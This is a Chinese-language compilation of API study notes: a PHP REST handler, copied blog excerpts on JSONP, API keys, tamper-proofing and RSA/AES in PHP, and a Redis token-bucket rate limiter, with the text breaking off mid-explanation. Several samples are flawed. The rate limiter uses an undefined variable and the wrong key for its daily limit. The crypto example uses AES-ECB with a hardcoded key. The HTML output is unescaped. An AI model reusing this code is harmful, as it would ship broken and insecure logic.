<?php 
require_once("SimpleRest.php");
require_once("Site.php");
 
class SiteRestHandler extends SimpleRest {
 
    function getAllSites() {    
 
        $site = new Site();
        $rawData = $site->getAllSite();
 
        if(empty($rawData)) {
            $statusCode = 404;
            $rawData = array('error' => 'No sites found!');        
        } else {
            $statusCode = 200;
        }
 
        $requestContentType = $_SERVER['HTTP_ACCEPT'];
        $this ->setHttpHeaders($requestContentType, $statusCode);
                
        if(strpos($requestContentType,'application/json') !== false){
            $response = $this->encodeJson($rawData);
            echo $response;
        } else if(strpos($requestContentType,'text/html') !== false){
            $response = $this->encodeHtml($rawData);
            echo $response;
        } else if(strpos($requestContentType,'application/xml') !== false){
            $response = $this->encodeXml($rawData);
            echo $response;
        }
    }
    
    public function encodeHtml($responseData) {
    
        $htmlResponse = "<table border='1'>";
        foreach($responseData as $key=>$value) {
                $htmlResponse .= "<tr><td>". $key. "</td><td>". $value. "</td></tr>";
        }
        $htmlResponse .= "</table>";
        return $htmlResponse;        
    }
    
    public function encodeJson($responseData) {
        $jsonResponse = json_encode($responseData);
        return $jsonResponse;        
    }
    
    public function encodeXml($responseData) {
        // 创建 SimpleXMLElement 对象
        $xml = new SimpleXMLElement('<?xml version="1.0"?><site></site>');
        foreach($responseData as $key=>$value) {
            $xml->addChild($key, $value);
        }
        return $xml->asXML();
    }
    
    public function getSite($id) {
 
        $site = new Site();
        $rawData = $site->getSite($id);
 
        if(empty($rawData)) {
            $statusCode = 404;
            $rawData = array('error' => 'No sites found!');        
        } else {
            $statusCode = 200;
        }
 
        $requestContentType = $_SERVER['HTTP_ACCEPT'];
        $this ->setHttpHeaders($requestContentType, $statusCode);
                
        if(strpos($requestContentType,'application/json') !== false){
            $response = $this->encodeJson($rawData);
            echo $response;
        } else if(strpos($requestContentType,'text/html') !== false){
            $response = $this->encodeHtml($rawData);
            echo $response;
        } else if(strpos($requestContentType,'application/xml') !== false){
            $response = $this->encodeXml($rawData);
            echo $response;
        }
    }
}
?>
接下来我们通过 http://localhost/restexample/site/list/ 访问，输出结果如下：


RESTful Web Service 客户端
接下来我们可以使用 Google Chrome 浏览器的 "Advance Rest Client" 作为 RESTful Web Service 客户端来请求我们的服务。

实例中请求 http://localhost/restexample/site/list/ 地址，接收数据类似为 Accept: application/json



请求 id 为 3 的站点 Runoob(菜鸟教程)，访问地址为 http://localhost/restexample/site/list/3/，



源码下载
实例中使用到的代码可点击以下按钮下载：
```

### 如何在不支持 `DELETE` 请求的浏览器上兼容 `DELETE` 请求
```
https://www.cnblogs.com/snandy/archive/2012/04/20/2459065.html
后端同事想采用REST风格，hailiang在看jQuery文档时发现的$.ajax不是所有浏览器中都支持put/delete。



 

但没有指出具体是那些浏览器。

 

我新建了一个Java WEB项目测试所有浏览器，但都支持put和delete。测试浏览器版本如下

 

Firefox 11

Chrome 18

Safari 5

Opera 11.62

IE9 （含ie7,8模式）

IE6 （IETester及虚拟机中的ie6）

 

 

记录之！

 

相关：

http://www.douban.com/group/topic/5020441/

http://annevankesteren.nl/2007/10/http-method-support

http://dobrzanski.net/2007/04/22/using-put-and-delete-methods-in-ajax-requesta-with-prototypejs/

http://stackoverflow.com/questions/165779/are-the-put-delete-head-etc-methods-available-in-most-web-browsers

 
```

### 常见 API 的 `APP_ID` `APP_SECRET` 主要作用是什么？阐述下流程 
```
https://blog.csdn.net/qq_24656927/article/details/54910875
App key简称API接口验证序号，是用于验证API接入合法性的。接入哪个网站的API接口，就需要这个网站允许才能够接入，如果简单比喻的话：可以理解成是登陆网站的用户名 
App Secret简称API接口密钥，是跟App Key配套使用的，可以简单理解成是密码 
App Key 和 App Secret 配合在一起，通过其他网站的协议要求，就可以接入API接口调用或使用API提供的各种功能和数据。 
比如淘宝联盟的API接口，就是淘宝客网站开发的必要接入，淘客程序通过API接口直接对淘宝联盟的数据库调用近亿商品实时数据。做到了轻松维护，自动更新。
```

### API 请求如何保证数据不被篡改？
```
https://www.oschina.net/question/228530_2288017
比如我开发了一个注册功能，前台通过ajax调用api提交用户资料。

如何保证用户无法修改接口参数值来达到其他目的呢？

 

 

举报
0
DeMoNHaDeS
DeMoNHaDeS 2018/10/16 14:45
达到什么其他目的？

做 对接口参数验证，防止频繁提交 等处理

 评论 (2)  引用此答案  举报
DeMoNHaDeS
DeMoNHaDeS 2018/10/16 15:29
回复 @j717273419 : 你的这个例子是在设计上有问题的。抽奖的金额一定是写在后台逻辑或数据里面，前台只能做类似发起抽奖的操作，接收后台传过来的抽奖金额等数据然后显示。
 回复  举报
j717273419
j717273419 2018/10/16 15:23
比如我一个页面是抽奖的，前台抽到一个金额，传给后台。如果用户这里用开发者工具截取了提交的参数。在这时修改了，是不是就能正常提交到后台了？那后台就收到以为中大奖了。这样是不是不安全？如何避免这种情况呢？
 回复  举报
0
微笑向阳啊 2018/10/19 16:48
如果是注册功能的话,只接收可修改的.不就是可以了.

 

 评论 (0)  引用此答案  举报
0
飞扬的梦
飞扬的梦 2018/10/19 17:12
不明白楼面主说的是什么问题，

如果是为了防止数据传输过程被修改，只要使用https协议就可以了。

如是是防止钓鱼网站修改，只要修改csfr token也可以。

但是无法防止用户自己通过调试代码修改数据。

 评论 (0)  引用此答案  举报
0
飞扬的梦
飞扬的梦 2018/10/19 17:13
这个命题也根本不存在的，WEB只是信息的载体，任何包含逻辑的运算都应该放在后台进行
```

### JSON 和 JSONP 的区别
```
https://www.cnblogs.com/bjfy/p/5461571.html
说到AJAX就会不可避免的面临两个问题，第一个是AJAX以何种格式来交换数据？第二个是跨域的需求如何解决？这两个问题目前都有不同的解决方案，比如数据可以用自定义字符串或者用XML来描述，跨域可以通过服务器端代理来解决。

但到目前为止最被推崇或者说首选的方案还是用JSON来传数据，靠JSONP来跨域。而这就是本文将要讲述的内容。

 

JSON和JSONP虽然只有一个字母的差别，但其实他们根本不是一回事儿：JSON是一种数据交换格式，而JSONP是一种依靠开发人员的聪明才智创造出的一种非官方跨域数据交互协议。我们拿最近比较火的谍战片来打个比方，JSON是地下党们用来书写和交换情报的“暗号”，而JSONP则是把用暗号书写的情报传递给自己同志时使用的接头方式。看到没？一个是描述信息的格式，一个是信息传递双方约定的方法。

 

什么是JSON

前面简单说了一下，JSON是一种基于文本的数据交换方式，或者叫做数据描述格式。 

JSON的优点：

1、基于纯文本，跨平台传递极其简单；

2、Javascript原生支持，后台语言几乎全部支持；

3、轻量级数据格式，占用字符数量极少，特别适合互联网传递；

4、可读性较强，虽然比不上XML那么一目了然，但在合理的依次缩进之后还是很容易识别的；

5、容易编写和解析，当然前提是你要知道数据结构；

JSON的格式或者叫规则：

JSON能够以非常简单的方式来描述数据结构，XML能做的它都能做，因此在跨平台方面两者完全不分伯仲。

1、JSON只有两种数据类型描述符，大括号{}和方括号[]，其余英文冒号:是映射符，英文逗号,是分隔符，英文双引号""是定义符。

2、大括号{}用来描述一组“不同类型的无序键值对集合”（每个键值对可以理解为OOP的属性描述），方括号[]用来描述一组“相同类型的有序数据集合”（可对应OOP的数组）。

3、上述两种集合中若有多个子项，则通过英文逗号,进行分隔。

4、键值对以英文冒号:进行分隔，并且建议键名都加上英文双引号""，以便于不同语言的解析。

5、JSON内部常用数据类型无非就是字符串、数字、布尔、日期、null 这么几个，字符串必须用双引号引起来，其余的都不用，日期类型比较特殊，这里就不展开讲述了，只是建议如果客户端没有按日期排序功能需求的话，那么把日期 时间直接作为字符串传递就好，可以省去很多麻烦。

 

JSON实例：

复制代码
复制代码
复制代码
// 描述一个人

var person = {
    "Name": "Bob",
    "Age": 32,
    "Company": "IBM",
    "Engineer": true
}

// 获取这个人的信息

var personAge = person.Age;

// 描述几个人

var members = [
    {
        "Name": "Bob",
        "Age": 32,
        "Company": "IBM",
        "Engineer": true
    },
    {
        "Name": "John",
        "Age": 20,
        "Company": "Oracle",
        "Engineer": false
    },
    {
        "Name": "Henry",
        "Age": 45,
        "Company": "Microsoft",
        "Engineer": false
    }
]

// 读取其中John的公司名称

var johnsCompany = members[1].Company;

// 描述一次会议

var conference = {
    "Conference": "Future Marketing",
    "Date": "2012-6-1",
    "Address": "Beijing",
    "Members": 
    [
        {
            "Name": "Bob",
            "Age": 32,
            "Company": "IBM",
            "Engineer": true
        },
        {
            "Name": "John",
            "Age": 20,
            "Company": "Oracle",
            "Engineer": false
        },
        {
            "Name": "Henry",
            "Age": 45,
            "Company": "Microsoft",
            "Engineer": false
        }
    ]
}

// 读取参会者Henry是否工程师

var henryIsAnEngineer = conference.Members[2].Engineer;
复制代码
复制代码
复制代码
 

 

什么是JSONP?

先说说JSONP是怎么产生的： 

1、一个众所周知的问题，Ajax直接请求普通文件存在跨域无权限访问的问题，甭管你是静态页面、动态网页、web服务、WCF，只要是跨域请求，一律不准；

2、不过我们又发现，Web页面上调用js文件时则不受是否跨域的影响（不仅如此，我们还发现凡是拥有"src"这个属性的标签都拥有跨域的能力，比如<script>、<img>、<iframe>）；

3、于是可以判断，当前阶段如果想通过纯web端（ActiveX控件、服务端代理、属于未来的HTML5之Websocket等方式不算）跨域访问数据就只有一种可能，那就是在远程服务器上设法把数据装进js格式的文件里，供客户端调用和进一步处理；

4、恰巧我们已经知道有一种叫做JSON的纯字符数据格式可以简洁的描述复杂数据，更妙的是JSON还被js原生支持，所以在客户端几乎可以随心所欲的处理这种格式的数据；

5、这样子解决方案就呼之欲出了，web客户端通过与调用脚本一模一样的方式，来调用跨域服务器上动态生成的js格式文件（一般以JSON为后缀），显而易见，服务器之所以要动态生成JSON文件，目的就在于把客户端需要的数据装入进去。

6、客户端在对JSON文件调用成功之后，也就获得了自己所需的数据，剩下的就是按照自己需求进行处理和展现了，这种获取远程数据的方式看起来非常像AJAX，但其实并不一样。

7、为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个 callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数 来自动处理返回数据了。

 

JSONP的客户端具体实现：

下面来说明一下jsonp在客户端的实现：

1、我们知道，哪怕跨域js文件中的代码（当然指符合web脚本安全策略的），web页面也是可以无条件执行的。

远程服务器remoteserver.com根目录下有个remote.js文件代码如下：

alert('我是远程文件');
本地服务器localserver.com下有个jsonp.html页面代码如下：

复制代码
复制代码
复制代码
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title></title>
    <script type="text/javascript" src="http://remoteserver.com/remote.js"></script>
</head>
<body>

</body>
</html>
复制代码
复制代码
复制代码
毫无疑问，页面将会弹出一个提示窗体，显示跨域调用成功。

 

2、现在我们在jsonp.html页面定义一个函数，然后在远程remote.js中传入数据进行调用。

jsonp.html页面代码如下：

复制代码
复制代码
复制代码
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title></title>
    <script type="text/javascript">
    var localHandler = function(data){
        alert('我是本地函数，可以被跨域的remote.js文件调用，远程js带来的数据是：' + data.result);
    };
    </script>
    <script type="text/javascript" src="http://remoteserver.com/remote.js"></script>
</head>
<body>

</body>
</html>
复制代码
复制代码
复制代码
remote.js文件代码如下：

localHandler({"result":"我是远程js带来的数据"});
运行之后查看结果，页面成功弹出提示窗口，显示本地函数被跨域的远程js调用成功，并且还接收到了远程js带来的数据。很欣喜，跨域远程获取数据的 目的基本实现了，但是又一个问题出现了，我怎么让远程js知道它应该调用的本地函数叫什么名字呢？毕竟是jsonp的服务者都要面对很多服务对象，而这些 服务对象各自的本地函数都不相同啊？我们接着往下看。

 

3、聪明的开发者很容易想到，只要服务端提供的js脚本是动态生成的就行了呗，这样调用者可以传一个参数过去告诉服务端“我想要一段调用XXX函数的js代码，请你返回给我”，于是服务器就可以按照客户端的需求来生成js脚本并响应了。

看jsonp.html页面的代码：

复制代码
复制代码
复制代码
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title></title>
    <script type="text/javascript">
    // 得到航班信息查询结果后的回调函数
    var flightHandler = function(data){
        alert('你查询的航班结果是：票价 ' + data.price + ' 元，' + '余票 ' + data.tickets + ' 张。');
    };
    // 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码）
    var url = "http://flightQuery.com/jsonp/flightResult.aspx?code=CA1998&callback=flightHandler";
    // 创建script标签，设置其属性
    var script = document.createElement('script');
    script.setAttribute('src', url);
    // 把script标签加入head，此时调用开始
    document.getElementsByTagName('head')[0].appendChild(script); 
    </script>
</head>
<body>

</body>
</html>
复制代码
复制代码
复制代码
这次的代码变化比较大，不再直接把远程js文件写死，而是编码实现动态查询，而这也正是jsonp客户端实现的核心部分，本例中的重点也就在于如何完成jsonp调用的全过程。

我们看到调用的url中传递了一个code参数，告诉服务器我要查的是CA1998次航班的信息，而callback参数则告诉服务器，我的本地回调函数叫做flightHandler，所以请把查询结果传入这个函数中进行调用。

OK，服务器很聪明，这个叫做flightResult.aspx的页面生成了一段这样的代码提供给jsonp.html（服务端的实现这里就不演示了，与你选用的语言无关，说到底就是拼接字符串）：

flightHandler({
    "code": "CA1998",
    "price": 1780,
    "tickets": 5
});
我们看到，传递给flightHandler函数的是一个json，它描述了航班的基本信息。运行一下页面，成功弹出提示窗口，jsonp的执行全过程顺利完成！

 

4、到这里为止的话，相信你已经能够理解jsonp的客户端实现原理了吧？剩下的就是如何把代码封装一下，以便于与用户界面交互，从而实现多次和重复调用。

jQuery对JSONP的实现
我们依然沿用上面那个航班信息查询的例子，假定返回jsonp结果不变：

复制代码
复制代码
复制代码
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" >
 <head>
     <title>Untitled Page</title>
      <script type="text/javascript" src=jquery.min.js"></script>
      <script type="text/javascript">
     jQuery(document).ready(function(){ 
        $.ajax({
             type: "get",
             async: false,
             url: "http://flightQuery.com/jsonp/flightResult.aspx?code=CA1998",
             dataType: "jsonp",
             jsonp: "callback",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)
             jsonpCallback:"flightHandler",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据
             success: function(json){
                 alert('您查询到航班信息：票价： ' + json.price + ' 元，余票： ' + json.tickets + ' 张。');
             },
             error: function(){
                 alert('fail');
             }
         });
     });
     </script>
     </head>
  <body>
  </body>
 </html>
复制代码
复制代码
复制代码
是不是有点奇怪？为什么我这次没有写flightHandler这个函数呢？而且竟然也运行成功了！这就是jQuery的功劳了，jquery在处理jsonp类型的ajax时（还是忍不住吐槽，虽然jquery也把jsonp归入了ajax，但其实它们真的不是一回事儿），自动帮你生成回调函数并把数据取出来供success属性方法来调用，是不是很爽呀？

 

这里针对ajax与jsonp的异同再做一些补充说明： 
1、ajax和jsonp这两种技术在调用方式上“看起来”很像，目的也一样，都是请求一个url，然后把服务器返回的数据进行处理，因此jquery和ext等框架都把jsonp作为ajax的一种形式进行了封装；

2、但ajax和jsonp其实本质上是不同的东西。ajax的核心是通过XmlHttpRequest获取非本页内容，而jsonp的核心则是动态添加<script>标签来调用服务器提供的js脚本。

3、所以说，其实ajax与jsonp的区别不在于是否跨域，ajax通过服务端代理一样可以实现跨域，jsonp本身也不排斥同域的数据的获取。

4、还有就是，jsonp是一种方式或者说非强制性协议，如同ajax一样，它也不一定非要用json格式来传递数据，如果你愿意，字符串都行，只不过这样不利于用jsonp提供公开服务。

总而言之，jsonp不是ajax的一个特例，哪怕jquery等巨头把jsonp封装进了ajax，也不能改变着一点！
```

### 数据加密和验签的区别
```
https://www.jb51.net/article/62091.htm
代码很简单，这里就不多废话了，直接奉上代码

复制代码代码如下:

<?php
//header('Content-Type: text/xml; charset=utf-8');
include_once(dirname(dirname(__FILE__)).DIRECTORY_SEPARATOR.'phpsec'.DIRECTORY_SEPARATOR.'Math'.DIRECTORY_SEPARATOR.'BigInteger.php');
include_once(dirname(dirname(__FILE__)).DIRECTORY_SEPARATOR.'phpsec'.DIRECTORY_SEPARATOR.'Crypt'.DIRECTORY_SEPARATOR.'AES.php');
include_once(dirname(dirname(__FILE__)).DIRECTORY_SEPARATOR.'phpsec'.DIRECTORY_SEPARATOR.'Crypt'.DIRECTORY_SEPARATOR.'RSA.php');
//密文
$crypttext = 'v66YKULHFld2JElhm/J9qik2Edr1JHdZIc/k/OesU2GbTX2usXyvF4jGvzvoihrrE8FsfKmllmjsMIjO5fdrS/FD20bYFii4JW3BO3bzshXmz6AEs2DWwG4sK9mNojfOC0IsMoV311X5/JlgUoQXkDy4F5HHpYE9d/xGb0g2XE/hnGSSy2cpQcvQtBlBmixwSckNhsEG92lovlOz8ULwkqG5o7x+qB7P/EMII/WaFAXBJXDXvZX7lmGcOgon6wLhKJLGXorP6BIxOg6LGc6Ux7BAt3i9+0lujNgxIq/sDsl23hsr3yOUpV5C5a813nrHx4HJyd/hBT1UvIUml+eTmJwWCpSfs2cvxIUr0CE57JAZVyXjK13shK3IsZHLPPsm/JcDCrdy0Co/d5uIGJAdzXdsQ56xsju+tlvnA1J6yq2tDIfYK/x6k911A5WXLKYxztD1nq+bTYN3Gv/WFfrzVtgWQBrh06ihS2cwvna0S9EV/YPmhnAjJmrX4trNr9NXQ9xaZaW4lGRg87U5QDV+nQjj1THk0XHFc69N9g2+DsAGyEs9tK6U0ZQ72hJZqZhBCDH1UKw0PLyIhJdxpgPPOWGp8/QVVU2julTeKunvgAAEc3n+GoZfqjsCDi1S6T2MTnjWYWNoFRBhvEZFD/revgpasTOzDQa5NqR1B+mUF70r6uw6MWLJ7cT9Tz3jq+CA';
$aeskey = base64_decode('qZe60QZFxuirub2ey4+7+Q==');
//AES解密，采用ECB模式
$aes = new Crypt_AES(CRYPT_MODE_ECB);
//设置AES密钥
$aes->setKey($aeskey);
//解密AES密文
$plaintext = $aes->decrypt(base64_decode($crypttext));
echo $plaintext;
echo '<hr />';
//AES加密明文
//echo $aes->encrypt($plaintext);
//rsa公钥
$publickey = 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCffOeIVYut9jW5w1L5uKX4aDvd837a8JhaWm5S8YqNQfgEmfD9T+rDknXLqMT+DXeQAqGo4hBmcbej1aoMzn6hIJHk3/TfTAToNN8fgwDotHewsTCBbVkQWtDTby3GouWToVsRi1i/A0Vfb0+xM8MnF46DdhhrnZrycERBSbyrcwIDAQAB';
//echo base64_decode($publickey);
//rsa签名
$signature = 'XHin4uUFqrKDEhKBD/hQisXLFFSxM6EZCvCPqnWCQJq3uEp3ayxmFuUgVE0Xoh4AIWjIIsOWdnaToL1bXvAFKwjCtXnkaRwUpvWrk+Q0eqwsoAdywsVQDEceG5stas1CkPtrznAIW2eBGXCWspOj+aumEAcPyYDxLhDN646Krzw=';
//echo base64_decode($signature);
$rsa = new Crypt_RSA();
//设置RSA签名模式 CRYPT_RSA_SIGNATURE_PSS or CRYPT_RSA_SIGNATURE_PKCS1
$rsa->setSignatureMode(CRYPT_RSA_SIGNATURE_PKCS1);
//var_dump($rsa->createKey());
//生成RSA公钥、私钥
//extract($rsa->createKey());
//使用RSA私钥生成签名
//$rsa->loadKey($privatekey);
//$signature = $rsa->sign($plaintext);
//使用RSA公钥验证签名
echo $plaintext;
$rsa->loadKey(base64_decode($publickey));
echo $rsa->verify($plaintext, base64_decode($signature)) ? 'verified' : 'unverified';
echo '<hr />';
//生成RSA公钥、私钥
//var_dump($rsa->createKey());
extract($rsa->createKey());
//使用RSA私钥加密数据
$rsa->loadKey($privatekey);
$ciphertext = $rsa->encrypt($plaintext);
//使用RSA公钥解密数据
$rsa->loadKey($publickey);
echo $rsa->decrypt($ciphertext);
以上就是本文所述的全部内容了，希望本代码能给大家学习php加密解密能够带来些帮助。
```

### RSA 是什么
```
https://www.cnblogs.com/hzijone/p/6306818.html
参考链接:http://www.cnblogs.com/firstForEver/p/5803940.html

 

自己封装的一个类:

复制代码
<?php 



class CRsaAuthorization
{

   public static  $public_key='-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCzNqnKnUn6S7WkOPQroM1rkh7j
nofhvUiWjU8N4RrHtnTW4FPz1540EXTP6n2+ohK5r1AujFaLLIk9PsM+guWY5iKk
9AoeLOSlDCX66ubuOnt0UpMK0pXwFrBl/M9FNNVVbfA/dWxbM65akhsLLB46o8/v
2oHdArVF4DVrh4rIhQIDAQAB
-----END PUBLIC KEY-----';
  
  private static  $pu_key;
  private static  $pi_key;
   
  private $licence;
    
    function __construct()
    {
      
      self::$pu_key=openssl_pkey_get_public(self::$public_key);
      // var_dump(self::$pu_key);
        
    }


    // public function get_public_key(){

    // }



 public function setPuKey($public_key){

      self::$pu_key=openssl_pkey_get_public($public_key);

 }


 public function setPiKey($private_key){
      self::$pi_key =  openssl_pkey_get_private($private_key);
 }


 public function privateDecrypt($encrypted = ''){

    // if (!is_string($encrypted)) {            
    //         return ;        
    //     }
      
     $split = str_split($encrypted, 172);// 1024bit  固定172
    foreach ($split as $part) {
        $isOkay = openssl_private_decrypt(base64_decode($part), $de_data, self::$pi_key);// base64在这里使用，因为172字节是一组，是encode来的
        if(!$isOkay){
            return false;
        }
        $decode_data .= $de_data;
    }
    return $decode_data;


 }

 public function publicDecrypt($encrypted = '')    
    {        
        if (!is_string($encrypted)) {            
            return ;        
        }

        // $encrypted = substr($encrypted,5);
        $encrypted = substr($encrypted,0,-5);

        // echo $encrypted;

        $size=strlen($encrypted);  
        // echo $size;
        $result="";
        for($i=0;$i<($size/172);$i++)
        {
          $data=substr($encrypted,$i*172,172);
          // echo $data."---------";
          if((openssl_public_decrypt(base64_decode($data), $decrypted, self::$pu_key)))
          {
            $result.=$decrypted;
            // echo $result;
          }
          else{
                // echo "decrypt failed";
              $result = "";
            }
        }       
       return $result; 
    }


public function publicEncrypt($originalData){

 
    $split = str_split($originalData, 100);// 1024bit && OPENSSL_PKCS1_PADDING  不大于117即可
    foreach ($split as $part) {
        $isOkay = openssl_public_encrypt($part, $en_data, self::$pu_key);
        if(!$isOkay){
            return false;
        }
        // echo strlen($en_data),'<br/>';
        $encode_data .= base64_encode($en_data);
    }
    return $encode_data;


}


    public function md5Checked($data,$parseLicence)
    {    

            $uid = exec('awk -F "=" \'/product_uuid/{print $2}\'  /etc/save_env',$output,$ret);
            if(empty($uid)) echo "获取uuid失败";

            // $data = 
            // $uid = "faf6d7fda265a4c65416009164398372d12f1f3d7f4cac2f";

            $chkstr=json_encode($data).$uid;
            
            // echo $chkstr."<br>";
            $strmd5=md5($chkstr);

            // echo "----".$strmd5."<br>";

            $licence="";
            
            for($i=1;$i<strlen($strmd5);$i=$i+2)
            {
                $licence .=strtoupper($strmd5[$i]);
            }
          
            // echo "licence:".$licence;



            if($licence!=$parseLicence){
                 return false;
            }else{
                 return true;
            }

    }

  


}

?>
```

### API 版本兼容怎么处理
```
https://www.cnblogs.com/vus520/p/3152772.html
原文：http://android.eoe.cn/topic/android_sdk

这节课程我们讨论如何创建一个实现类，即能对应新版本的API，又能够保持对老版本API的支持。

* 寻找一个替代的解决方案*
为了保持向后兼容，我们需要用老版本平台的UI框架特性来实现新本版的UI框架特性，这是一件非常具有挑战性的任务。在很多情况下，我们是完全可以做到这一点的，请看下边的例子：

Action bars_'能够用一个 horizontal''' LinearLayout'''在你Activity Layout中实现，这个LinearLayout可以添加一个自定义的标题或者是Views，加上'''image buttons''',执行的动作可以在设备的'_Menu button* 来显示。
Action bar tabs_' 可以用 '''horizontal LinearLayout''' 加上按钮或者用'_TabWidget UI* 来实现。
NumberPicker_'和'''Switch'''部件可以用'''Spinner'''和'_ToggleButton* 部件分别实现。
ListPopupWindow_'和'''PopupMenu'''部件可以用'_PopupWindow* 部件来实现。
一般情况下，我们无法找到一个完美的方案，可以把新UI组件的完全的移植到旧版本的设备上。在这个问题上我们应该多考虑一下用户体验，使用老版本设备的用户可能对新版本的设计模式并不熟悉。因此我们在实现的时候要考虑相同的功能实现尽量用用户熟悉的方式来实现。很多情况下我们不必过于担心这个问题，如果这个新的UI组件在应用程序的环境中设计的比较优秀（比如：* Action Bar_'）或者交互模式非常简单和直观的（比如：'_Swip Views* 应用 ViewPager）。

* 用较早版本API实现Tabs*
我们可以用TabWidget和TabHost(我们也可以用* horizontally laid-out_' Button部件)来实现'''ActionBar'''标签。因为我们使用了Android 2.0 (Eclair)以下的APIs，所以我们的实现类名字叫做'''TabHelperEclair'''和'_CompatTabEclair* ：

文件:Backward-compatible-ui-classes-eclair.png

图1：* Eclair* 实现tabs的类图

实现* CompatTabEclair* 时需要在变量中保存tab的属性，比如：text、icon等。因为我们已经没有现成的ActionBar.Tab可以帮助来处理这些属性了。

public class CompatTabEclair extends CompatTab {
// Store these properties in the instance,
// as there is no ActionBar.Tab object.
private CharSequence mText;
...

1
2
3
4
5
6
7
8
9
public CompatTab setText(int resId) {
    // Our older implementation simply stores this
    // information in the object instance.
    mText = mActivity.getResources().getText(resId);
    return this;
}

...
// Do the same for other properties (icon, callback, etc.)
}

实现* TabHelperEclair_'时需要需要用到TabHost部件来创建TabHost.TabSpec对象和'_tab indicators* :

public class TabHelperEclair extends TabHelper {
private TabHost mTabHost;
...

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
protected void setUp() {
    if (mTabHost == null) {
        // Our activity layout for pre-Honeycomb devices
        // must contain a TabHost.
        mTabHost = (TabHost) mActivity.findViewById(
                android.R.id.tabhost);
        mTabHost.setup();
    }
}

public void addTab(CompatTab tab) {
    ...
    TabSpec spec = mTabHost
            .newTabSpec(tag)
            .setIndicator(tab.getText()); // And optional icon
    ...
    mTabHost.addTab(spec);
}

// The other important method, newTab() is part of
// the base implementation.
}

现在我们有* CompatTab_'和'_TabHelper* 的两个实现类了，一个用在Android 3.0或者更新的版本的APIs中，一个用在Android 2.0或更新版本的APIs中，下节课我们将讨论如何在我们的应用中使用这样两个实现类。
```

### 限流（木桶、令牌桶）
```
https://www.jianshu.com/p/9f76dd2757c7
一 、场景描述
在开发接口服务器的过程中，为了防止客户端对于接口的滥用，保护服务器的资源， 通常来说我们会对于服务器上的各种接口进行调用次数的限制。比如对于某个 用户，他在一个时间段（interval）内，比如 1 分钟，调用服务器接口的次数不能够 大于一个上限（limit），比如说 100 次。如果用户调用接口的次数超过上限的话，就直接拒绝用户的请求，返回错误信息。
服务接口的流量控制策略：分流、降级、限流等。本文讨论下限流策略，虽然降低了服务接口的访问频率和并发量，却换取服务接口和业务应用系统的高可用。

二、常用的限流算法
1、漏桶算法
漏桶(Leaky Bucket)算法思路很简单,水(请求)先进入到漏桶里,漏桶以一定的速度出水(接口有响应速率),当水流入速度过大会直接溢出(访问频率超过接口响应速率),然后就拒绝请求,可以看出漏桶算法能强行限制数据的传输速率.示意图如下:
　　　

可见这里有两个变量,一个是桶的大小,支持流量突发增多时可以存多少的水(burst),另一个是水桶漏洞的大小(rate)。
因为漏桶的漏出速率是固定的参数,所以,即使网络中不存在资源冲突(没有发生拥塞),漏桶算法也不能使流突发(burst)到端口速率.因此,漏桶算法对于存在突发特性的流量来说缺乏效率.
2、令牌桶算法
令牌桶算法(Token Bucket)和 Leaky Bucket 效果一样但方向相反的算法,更加容易理解.随着时间流逝,系统会按恒定1/QPS时间间隔(如果QPS=100,则间隔是10ms)往桶里加入Token(想象和漏洞漏水相反,有个水龙头在不断的加水),如果桶已经满了就不再加了.新请求来临时,会各自拿走一个Token,如果没有Token可拿了就阻塞或者拒绝服务.



令牌桶的另外一个好处是可以方便的改变速度. 一旦需要提高速率,则按需提高放入桶中的令牌的速率. 一般会定时(比如100毫秒)往桶中增加一定数量的令牌, 有些变种算法则实时的计算应该增加的令牌的数量.

三、基于PHP+Redis实现的令牌桶算法
<?php
namespace Api\Lib;

/**
 * 限流控制
 */
class RateLimit
{
    private $minNum = 60; //单个用户每分访问数
    private $dayNum = 10000; //单个用户每天总的访问量

    public function minLimit($uid)
    {
        $minNumKey = $uid . '_minNum';
        $dayNumKey = $uid . '_dayNum';
        $resMin    = $this->getRedis($minNumKey, $this->minNum, 60);
        $resDay    = $this->getRedis($minNumKey, $this->minNum, 86400);
        if (!$resMin['status'] || !$resDay['status']) {
            exit($resMin['msg'] . $resDay['msg']);
        }
    }

    public function getRedis($key, $initNum, $expire)
    {
        $nowtime  = time();
        $result   = ['status' => true, 'msg' => ''];
        $redisObj = $this->di->get('redis');
        $redis->watch($key);
        $limitVal = $redis->get($key);
        if ($limitVal) {
            $limitVal = json_decode($limitVal, true);
            $newNum   = min($initNum, ($limitVal['num'] - 1) + (($initNum / $expire) * ($nowtime - $limitVal['time'])));
            if ($newNum > 0) {
                $redisVal = json_encode(['num' => $newNum, 'time' => time()]);
            } else {
                return ['status' => false, 'msg' => '当前时刻令牌消耗完！'];
            }
        } else {
            $redisVal = json_encode(['num' => $initNum, 'time' => time()]);
        }
        $redis->multi();
        $redis->set($key, $redisVal);
        $rob_result = $redis->exec();
        if (!$rob_result) {
            $result = ['status' => false, 'msg' => '访问频次过多！'];
        }
        return $result;
    }
}
代码要点：
1：首先定义规则
单个用户每分钟访问次数（$minNum），单个用户每天总的访问次数（$dayNum），接口总的访问次数等不同的规则。
2：计算速率
